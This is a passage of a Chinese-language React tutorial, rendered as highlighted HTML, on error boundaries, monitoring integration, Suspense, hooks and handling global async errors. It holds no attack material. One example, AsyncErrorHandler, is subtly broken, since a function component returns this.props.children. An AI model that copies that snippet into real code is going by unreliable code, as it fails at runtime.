=&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">errorInfo</span>: <span class="hljs-literal">null</span> &#125;);<br>  &#125;;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">error</span>) &#123;<br>      <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>组件崩溃<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">ErrorDetails</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">error</span>=<span class="hljs-string">&#123;this.state.error&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">stack</span>=<span class="hljs-string">&#123;this.state.errorInfo.componentStack&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;this.handleReset&#125;</span>&gt;</span></span><br><span class="language-xml">            重置组件</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      );<br>    &#125;<br>    <br>    <span class="hljs-comment">// 使用 key 强制重置子组件</span><br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;this.state.recoveryKey&#125;</span>&gt;</span>&#123;this.props.children&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 错误详情组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ErrorDetails</span>(<span class="hljs-params">&#123; error, stack &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">whiteSpace:</span> &#x27;<span class="hljs-attr">pre-wrap</span>&#x27; &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>&#123;error.toString()&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>&#123;stack&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="企业级最佳实践"><a href="#企业级最佳实践" class="headerlink" title="企业级最佳实践"></a>企业级最佳实践</h3><p><strong>多层错误边界策略</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AppHierarchy</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;app&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AppCrashScreen</span> /&gt;</span>&#125;</span><br><span class="language-xml">    &gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;billing&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">BillingModuleError</span> /&gt;</span>&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">BillingDashboard</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;user-profile&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ProfileError</span> /&gt;</span>&#125;</span><br><span class="language-xml">      &gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;notifications&quot;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;null&#125;</span> // <span class="hljs-attr">静默失败</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">NotificationCenter</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>错误边界与监控系统集成</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MonitoringErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-comment">// 发送错误到监控平台</span><br>    monitoringClient.<span class="hljs-title function_">captureException</span>(error, &#123;<br>      <span class="hljs-attr">extra</span>: &#123;<br>        <span class="hljs-attr">componentStack</span>: errorInfo.<span class="hljs-property">componentStack</span>,<br>        <span class="hljs-attr">userId</span>: <span class="hljs-title function_">getCurrentUser</span>()?.<span class="hljs-property">id</span>,<br>        <span class="hljs-attr">route</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span><br>      &#125;,<br>      <span class="hljs-attr">tags</span>: &#123; <span class="hljs-attr">error_boundary</span>: <span class="hljs-literal">true</span> &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// 自定义错误处理</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">onError</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">onError</span>(error, errorInfo);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span> <br>      ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">fallback</span> <br>      : <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br>&lt;<span class="hljs-title class_">MonitoringErrorBoundary</span><br>  fallback=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorScreen</span> /&gt;</span></span>&#125;<br>  onError=&#123;<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 特殊错误类型处理</span><br>    <span class="hljs-keyword">if</span> (error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PaymentError</span>) &#123;<br>      router.<span class="hljs-title function_">navigate</span>(<span class="hljs-string">&#x27;/payment-failed&#x27;</span>);<br>    &#125;<br>  &#125;&#125;<br>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">CheckoutProcess</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">MonitoringErrorBoundary</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>错误边界与Suspense集成</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AsyncBoundary</span>(<span class="hljs-params">&#123; children, fallback, errorFallback &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;errorFallback&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">React.Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;fallback&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">React.Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br>&lt;<span class="hljs-title class_">AsyncBoundary</span> <br>  fallback=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span></span>&#125;<br>  errorFallback=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AsyncError</span> /&gt;</span></span>&#125;<br>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LazyComponent</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">AsyncBoundary</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="函数组件错误处理方案"><a href="#函数组件错误处理方案" class="headerlink" title="函数组件错误处理方案"></a>函数组件错误处理方案</h3><p><strong>自定义Hook实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useErrorBoundary</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> handleError = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">setError</span>(err);<br>    <span class="hljs-keyword">return</span> err;<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">const</span> resetError = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">setError</span>(<span class="hljs-literal">null</span>);<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> [error, handleError, resetError];<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentWithError</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [error, handleError, resetError] = <span class="hljs-title function_">useErrorBoundary</span>();<br>  <br>  <span class="hljs-keyword">if</span> (error) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>组件出错: &#123;error.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;resetError&#125;</span>&gt;</span>重试<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UnstableComponent</span> <span class="hljs-attr">onError</span>=<span class="hljs-string">&#123;handleError&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UnstableComponent</span>(<span class="hljs-params">&#123; onError &#125;</span>) &#123;<br>  <span class="hljs-comment">// 模拟错误</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">throwError</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// 可能出错的操作</span><br>      <span class="hljs-title function_">riskyOperation</span>();<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-title function_">onError</span>(err); <span class="hljs-comment">// 手动触发错误边界</span><br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;throwError&#125;</span>&gt;</span>执行危险操作<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>第三方Hook库</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 react-error-boundary 库</span><br><span class="hljs-keyword">import</span> &#123; useErrorBoundary &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-error-boundary&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; showBoundary &#125; = <span class="hljs-title function_">useErrorBoundary</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUserData</span>();<br>      <span class="hljs-comment">// 处理数据...</span><br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      <span class="hljs-title function_">showBoundary</span>(error);<br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;loadData&#125;</span>&gt;</span>加载数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="常见错误场景与解决方案"><a href="#常见错误场景与解决方案" class="headerlink" title="常见错误场景与解决方案"></a>常见错误场景与解决方案</h3><p><strong>异步错误捕获</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误边界无法捕获的异步错误解决方案</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AsyncErrorHandler</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// 全局未捕获错误处理</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUnhandledRejection</span> = (<span class="hljs-params">event</span>) =&gt; &#123;<br>      <span class="hljs-title function_">setError</span>(event.<span class="hljs-property">reason</span>);<br>    &#125;;<br>    <br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUncaughtError</span> = (<span class="hljs-params">event</span>) =&gt; &#123;<br>      <span class="hljs-title function_">setError</span>(event.<span class="hljs-property">error</span>);<br>    &#125;;<br>    <br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;unhandledrejection&#x27;</span>, handleUnhandledRejection);<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;error&#x27;</span>, handleUncaughtError);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;unhandledrejection&#x27;</span>, handleUnhandledRejection);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;error&#x27;</span>, handleUncaughtError);<br>    &#125;;<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">if</span> (error) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">GlobalErrorScreen</span> <span class="hljs-attr">error</span>=<span class="hljs-string">&#123;error&#125;</span> /&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>&#125;<br><br><span class="hljs-comment">// 在应用顶层使用</span><br>&lt;<span class="hljs-title class_">AsyncErrorHandler</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">AsyncErrorHandler</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>错误边界嵌套冲突</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 自定义错误传播机制</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PropagatingErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">onError</span>) &#123;<br>      <span class="hljs-comment">// 将错误传递给父级边界</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">onError</span>(error, errorInfo);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) &#123;<br>      <span class="hljs-comment">// 没有父级处理器时处理错误</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Unhandled error:&#x27;</span>, error, errorInfo);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span> <br>      ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">fallback</span> <br>      : <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br>&lt;<span class="hljs-title class_">PropagatingErrorBoundary</span> <br>  onError=&#123;<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123; <span class="hljs-comment">/* 传递给上层 */</span> &#125;&#125;<br>  fallback=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LocalFallback</span> /&gt;</span></span>&#125;<br>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">PropagatingErrorBoundary</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>生产环境错误处理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 生产环境专用错误边界</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductionErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;);<br>    <br>    <span class="hljs-comment">// 生产环境特殊处理</span><br>    <span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>      <span class="hljs-title function_">sendProductionErrorReport</span>(error, &#123;<br>        <span class="hljs-attr">componentStack</span>: errorInfo.<span class="hljs-property">componentStack</span>,<br>        <span class="hljs-attr">userAgent</span>: navigator.<span class="hljs-property">userAgent</span><br>      &#125;);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">productionFallback</span> || (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;production-error&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>抱歉，出现了一些问题<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span 